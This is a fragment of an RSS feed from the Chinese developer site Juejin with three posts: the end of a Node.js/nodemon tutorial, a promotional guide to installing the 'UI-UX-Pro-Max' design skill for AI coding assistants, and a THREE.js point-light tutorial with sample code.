<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"start"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node code.js"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<h2 data-id="heading-23">14.nodemon</h2>
<p>nodemon是一种工具，可以自动检测到目录中的文件更改时通过重新启动应用程序来调试基于node.js的应用程序。</p>
<pre><code class="hljs">npm install -g nodemon
</code></pre>
<p>有了这个命令，我们就不再需要每次修改完毕代码进行重启了，他可以检测文件的改变而自动重启</p>
<pre><code class="hljs">nodemon app.js
</code></pre>
<p>当然。nodemon不仅有以上功能，他还有很多配置，但是对于目前我们的需求来说不太需要，在这里不做叙述</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 写 UI 太丑？这个skills让它秒变设计专家]]></title>    <link>https://juejin.cn/post/7602466689712046095</link>    <guid>https://juejin.cn/post/7602466689712046095</guid>    <pubDate>2026-02-03T13:00:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689712046095" data-draft-id="7602472997920440320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 写 UI 太丑？这个skills让它秒变设计专家"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T13:00:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aZhe的全栈知识分享"/> <meta itemprop="url" content="https://juejin.cn/user/1039471959105228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 写 UI 太丑？这个skills让它秒变设计专家
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039471959105228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aZhe的全栈知识分享
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:00:15.000Z" title="Tue Feb 03 2026 13:00:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是否发现，AI 写的代码逻辑虽然完美，但界面总是透着一股“程序员味”？配色辣眼、布局生硬、字体乱用……</p>
<p><strong>UI-UX-Pro-Max-Skill</strong> 就是为了解决这个问题而生的。它不仅仅是一个代码库，更是给 AI 装上的一个<strong>专业设计大脑</strong>。它包含 <strong>67+ UI 风格</strong>、<strong>96+ 行业配色</strong> 和 <strong>100+ 推理规则</strong>，让 AI 能够像资深设计师一样思考。</p>
<p>本文教你 <strong>30秒安装</strong>，<strong>3分钟上手</strong>，让你的 AI 产出专业级 UI。</p>
<h2 data-id="heading-0">1. 极速安装 (30秒)</h2>
<p>不需要下载源码，不需要配置 Python 环境，直接用 CLI 工具一键集成。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 全局安装工具</span>
npm install -g uipro-cli

<span class="hljs-comment"># 2. 为你的 AI 助手注入灵魂 (按需选择)</span>
uipro init --ai claude      <span class="hljs-comment"># Claude Code 用户</span>
uipro init --ai trae        <span class="hljs-comment"># Trae 用户</span>
uipro init --ai cursor      <span class="hljs-comment"># Cursor 用户</span>
uipro init --ai windsurf    <span class="hljs-comment"># Windsurf 用户</span>
</code></pre>
<p><em>看到 <code>Success</code> 提示后，你的 AI 就已经学会这项技能了！</em></p>
<h2 data-id="heading-1">2. 实战用法 (直接抄作业)</h2>
<p>安装好后，你<strong>不需要</strong>敲任何复杂的命令，只需要学会怎么跟 AI <strong>“说黑话”</strong>。</p>
<h3 data-id="heading-2">场景 A：从零设计一个新产品 (最常用)</h3>
<p>当你需要 AI 写一个完整的页面时，直接套用这个公式：</p>
<blockquote>
<p><strong>Prompt 公式</strong>：<code>产品类型</code> + <code>行业/风格</code> + <code>生成设计系统</code></p>
</blockquote>
<p><strong>直接复制这段话给 AI：</strong></p>
<blockquote>
<p>"帮我设计一个<strong>宠物领养 App</strong> 的落地页，风格要<strong>温馨、可爱</strong>。请先基于 UI-UX-Pro-Max 生成一套设计系统，然后再写代码。"
这是我一句话生成的效果，完全没有微调，如果再调整一下细节的话，可以想象有多么炸裂吧！！！！</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a34f002a153b4f80ae7332448e668dfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYVpoZeeahOWFqOagiOefpeivhuWIhuS6qw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770728415&amp;x-signature=VxDq2cdh8P%2FhFcBbILEXs4ZTPao%3D" alt="image.png" loading="lazy"/>
<strong>AI 的反应：</strong></p>
<ol>
<li><strong>自动推理</strong>：识别到“宠物”，自动推荐 <strong>圆角卡片 (Claymorphism)</strong> 风格。</li>
<li><strong>自动配色</strong>：生成 <strong>暖黄 (#F59E0B)</strong> 搭配 <strong>柔白</strong> 的配色方案。</li>
<li><strong>自动排版</strong>：选择 <strong>Nunito (圆体)</strong> 字体。</li>
<li><strong>生成代码</strong>：产出完全符合上述规范的 Tailwind 代码。</li>
</ol>
<h3 data-id="heading-3">场景 B：只想要个配色/灵感</h3>
<p>你不需要写代码，只想让 AI 给点设计建议：</p>
<p><strong>直接问 AI：</strong></p>
<blockquote>
<p>"适合<strong>金融科技 (Fintech)</strong> 产品的配色方案有哪些？"
"帮我找几个适合<strong>赛博朋克风格</strong>的字体搭配。"</p>
</blockquote>
<h3 data-id="heading-4">场景 C：团队开发，统一风格 (进阶)</h3>
<p>为了防止 AI 今天写出 A 风格，明天写出 B 风格，你可以让它把规范<strong>存下来</strong>。</p>
<p><strong>直接对 AI 说：</strong></p>
<blockquote>
<p>"为我的 <strong>SaaS 后台</strong>生成一套设计系统，并<strong>保存为 <code>design-system.md</code> 文件</strong>。以后的设计都参考这个文件。"</p>
</blockquote>
<h2 data-id="heading-5">3. 原理解析：它为什么这么聪明？</h2>
<p>很多同学担心：“装了这个技能，会不会让 AI 变慢？会不会浪费我的 Token？”</p>
<p><strong>完全不会！</strong> 这个技能采用了**“渐进式披露” (Progressive Disclosure)** 的设计理念，简单说就是**“平时装睡，叫它才醒”**：</p>
<ol>
<li><strong>平时静默</strong>：当你聊普通代码（如“写个排序算法”）时，技能<strong>完全不加载</strong>，不占用任何 Token。</li>
<li><strong>按需触发</strong>：只有当你明确提到“设计”、“界面”、“UI”等关键词时，它才会“醒来”。</li>
<li><strong>精准注入</strong>：它不会把整个数据库塞给 AI，而是只提取你当前需要的（比如只提取“医疗行业配色”），最大程度省钱。</li>
</ol>
<p><strong>简单说：它就是 AI 的“外挂大脑”，平时隐身，只在你需要设计时才闪现。</strong></p>
<h2 data-id="heading-6">4. 各平台使用小贴士</h2>
<p>虽然核心体验一致，但不同 AI 工具略有差异：</p>

























<table><thead><tr><th align="left">AI 工具</th><th align="left">关键操作</th></tr></thead><tbody><tr><td align="left"><strong>Claude Code</strong></td><td align="left"><strong>零操作</strong>。安装插件后，直接对话即可触发。</td></tr><tr><td align="left"><strong>Trae</strong></td><td align="left">必须切换到 <strong>SOLO 模式</strong>，技能才会生效。</td></tr><tr><td align="left"><strong>Cursor / Windsurf</strong></td><td align="left">初始化后，AI 会自动读取配置，直接对话即可。</td></tr><tr><td align="left"><strong>Codex</strong></td><td align="left">支持 <strong>Auto-activate</strong>，直接对话即可。</td></tr></tbody></table>
<h2 data-id="heading-7">5. 避坑指南</h2>
<ol>
<li><strong>不要手动跑脚本</strong>：虽然项目里有很多 Python 脚本，但那是给 AI 用的，你不需要自己去终端里敲 <code>python search.py...</code>。</li>
<li><strong>多给业务背景</strong>：不要只说“设计个网页”。说“设计个<strong>医疗</strong>网页”或“设计个<strong>游戏</strong>网页”，AI 调用的设计规则会完全不同（医疗=蓝/白/洁净；游戏=黑/紫/酷炫）。</li>
<li><strong>检查反模式</strong>：该技能会自动帮你检查 UX 问题（比如“不要用 Emoji 当图标”），如果 AI 犯了错，直接提醒它：“检查一下 Anti-patterns”。</li>
</ol>
<hr/>
<p><strong>总结</strong>：安装 <code>uipro-cli</code> -&gt; 初始化 -&gt; 告诉 AI 你要做什么 -&gt; 享受专业级 UI。就这么简单！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[THREE.js 光照- 2]]></title>    <link>https://juejin.cn/post/7602503154505203753</link>    <guid>https://juejin.cn/post/7602503154505203753</guid>    <pubDate>2026-02-03T13:32:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602503154505203753" data-draft-id="7602401081265209380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="THREE.js 光照-  2"/> <meta itemprop="keywords" content="前端,three.js,WebGL"/> <meta itemprop="datePublished" content="2026-02-03T13:32:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="龙猫不热"/> <meta itemprop="url" content="https://juejin.cn/user/4098608612778654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            THREE.js 光照-  2
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4098608612778654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    龙猫不热
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:32:47.000Z" title="Tue Feb 03 2026 13:32:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">前置补充</h2>
<p>在前文的基础代码之上, 又新增了些代码</p>
<pre><code class="hljs language-js" lang="js">
  <span class="hljs-comment">// 弧度转度数</span>
  <span class="hljs-keyword">class</span> <span class="hljs-title class_">DegRadHelper</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">obj, prop</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span> = obj;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span> = prop;
    }
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
      <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">radToDeg</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span>]);
    }
    <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">v</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">obj</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">prop</span>] = <span class="hljs-variable constant_">THREE</span>.<span class="hljs-property">MathUtils</span>.<span class="hljs-title function_">degToRad</span>(v);
    }
  }

  <span class="hljs-comment">// gui 快捷绑定对象的 x y z属性</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeXYZGUI</span>(<span class="hljs-params">gui, vector3, name, onChangeFn</span>) {
    <span class="hljs-keyword">const</span> folder = gui.<span class="hljs-title function_">addFolder</span>(name);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"x"</span>, -<span class="hljs-number">10</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"y"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">add</span>(vector3, <span class="hljs-string">"z"</span>, -<span class="hljs-number">10</span>, <span class="hljs-number">10</span>).<span class="hljs-title function_">onChange</span>(onChangeFn);
    folder.<span class="hljs-title function_">open</span>();
  }
</code></pre>
<hr/>
<h2 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fthreejs.org%2Fdocs%2F%23api%2Fzh%2Flights%2FPointLight" target="_blank" title="https://threejs.org/docs/#api/zh/lights/PointLight" ref="nofollow noopener noreferrer"><code>PointLight</code></a> 点光源</h2>
<p>点光源, 表示从一个点朝向各个方向发射出光线的一种光照效果</p>
<p>常用于模拟灯泡灯光, 有阴影</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> pointColor = <span class="hljs-number">0xffffff</span>;
  <span class="hljs-keyword">const</span> pointerIntensity = <span class="hljs-number">150</span>;
  <span class="hljs-keyword">const</span> pointLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PointLight</span>(pointColor, pointerIntensity);
  pointLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);
  scene.<span class="hljs-title function_">add</span>(pointLight);

  <span class="hljs-comment">// 点光源辅助器</span>
  <span class="hljs-keyword">const</span> pointLightHelper = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PointLightHelper</span>(pointLight);
  scene.<span class="hljs-title function_">add</span>(pointLightHelper);
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">updatePointLight</span>(<span class="hljs-params"/>) {
   <span class="hljs-comment">// 因为点光源没有 `target` 属性，所以 `onChange` 函数可以简化。</span>
    pointLightHelper.<span class="hljs-title function_">update</span>();
  }

  <span class="hljs-comment">// 添加 gui 属性控制</span>
  <span class="hljs-keyword">const</span> pointLightFolder = gui.<span class="hljs-title function_">addFolder</span>(<span class="hljs-string">"点光源控制"</span>);
  gui.<span class="hljs-title function_">addColor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ColorGUIHelper</span>(pointLight, <span class="hljs-string">"color"</span>), <span class="hljs-string">"value"</span>).<span class="hljs-title function_">name</span>(<span class="hljs-string">"color"</span>);
  gui.<span class="hljs-title function_">add</span>(pointLight, <span class="hljs-string">"intensity"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">250</span>, <span class="hljs-number">1</span>);
  gui.<span class="hljs-title function_">add</span>(pointLight, <span class="hljs-string">"distance"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>).<span class="hljs-title function_">onChange</span>(updatePointLight);
  <span class="hljs-title function_">makeXYZGUI</span>(pointLightFolder, pointLight.<span class="hljs-property">position</span>, <span class="hljs-string">"position"</span>, updatePointLight);
  
</code></pre>
